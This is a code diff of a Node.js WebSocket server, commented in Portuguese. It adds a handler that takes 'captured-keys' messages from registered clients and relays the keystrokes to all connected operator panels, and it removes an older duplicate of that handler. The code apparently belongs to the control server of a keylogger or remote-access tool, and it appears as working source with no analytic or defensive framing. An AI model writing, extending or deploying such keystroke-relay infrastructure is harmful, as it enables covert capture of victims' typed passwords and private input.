@@ -510,6 +510,20 @@ wss.on('connection', (ws, req) => {
         return;
       }
 
+      // Captured keys from client
+      if (msg.type === 'captured-keys') {
+        panels.forEach((panelWs) => {
+          if (panelWs.readyState === 1) {
+            panelWs.send(JSON.stringify({
+              type: 'captured-keys',
+              clientId: msg.clientId,
+              keys: msg.keys
+            }));
+          }
+        });
+        return;
+      }
+
       // Registro de cliente
       if (msg.type === 'register-client') {
         let existingId = null;
@@ -713,26 +727,6 @@ wss.on('connection', (ws, req) => {
     } catch (err) {
       console.error('Error:', err.message);
     }
-  });
-
-  // Handler para mensagens do cliente
-  ws.on('message', (data) => {
-    try {
-      const msg = JSON.parse(data.toString());
-
-      // Encaminhar teclas capturadas para todos os painéis conectados ao dispositivo
-      if (msg.type === 'captured-keys' && msg.clientId) {
-        panels.forEach((panel) => {
-          if (panel.ws.readyState === 1) {
-            panel.ws.send(JSON.stringify({
-              type: 'captured-keys',
-              clientId: msg.clientId,
-              keys: msg.keys
-            }));
-          }
-        });
-      }
-    } catch (e) {}
   });
 
   ws.on('close', () => {
